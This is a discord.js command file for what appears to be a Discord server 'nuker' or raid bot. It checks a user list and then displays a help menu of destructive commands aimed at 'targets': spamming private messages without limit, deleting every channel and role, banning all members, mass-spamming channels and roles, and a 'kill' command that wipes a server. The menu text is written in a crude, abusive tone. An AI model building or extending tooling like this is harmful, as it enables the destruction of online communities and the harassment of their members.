const Discord = require('discord.js');
const db = require('megadb')
const blacklist = new db.crearDB("blacklist")
const sexo = "0x410255"

module.exports = {
  name: "command",
  alias: [],

async execute (client, message, args){

  const waitingembed = new Discord.MessageEmbed()
        
        .setDescription('Please wait while the commands load <a:custom_emoji:1215557264732332053>')
        .setColor(sexo)

  let msg = await message.reply({embeds: [waitingembed]})

  if(!blacklist.has(message.author.id)){
    const a = new Discord.MessageEmbed()
    .setDescription("You are not registered in the Whitelist.")
    .setColor(sexo)
    return msg.edit({embeds: [a]})
  }     

  const lol = new Discord.MessageEmbed()
  .setDescription("**Commands (15):**\n> `spamdm`: Spam unlimited private messages!\n> `tempspamdm`: Spam private messages with limit!\n> `spam`: spamming mentions to a user.\n> `servers`: Targets!\n> `perms`: Bot permissions on the server.\n> `invite`: Give the invitation to the targets!\n> `kill`: Destroy command that deletes all channels and spams channels!\n> `dchannels`: Destroy command that deletes all channels bitch!\n> `droles`: Delete the server roles!!\n> `spamroles`: Spam roles bitch!!\n> `spamchannel`: Spammed channels bitch!!!\n> `tempspamchannel`: Spammed channels with limit!\n> `banall`: Ban all members bitch!!\n> `dmall`: Message all members.\n> `alert`: Message spam!")
    .setThumbnail("https://media.discordapp.net/attachments/945559913055256616/1186944453240430643/Converter.png?ex=6595172a&is=6582a22a&hm=92a7fe80ad6aa1b1cc88965d2fc07861b2a607c59ffbc3f9e19fdb81b598a1f3&=&format=webp&quality=lossless&width=411&height=388")
  .setColor(sexo)

   msg.edit({ embeds: [lol] })

  





 }

}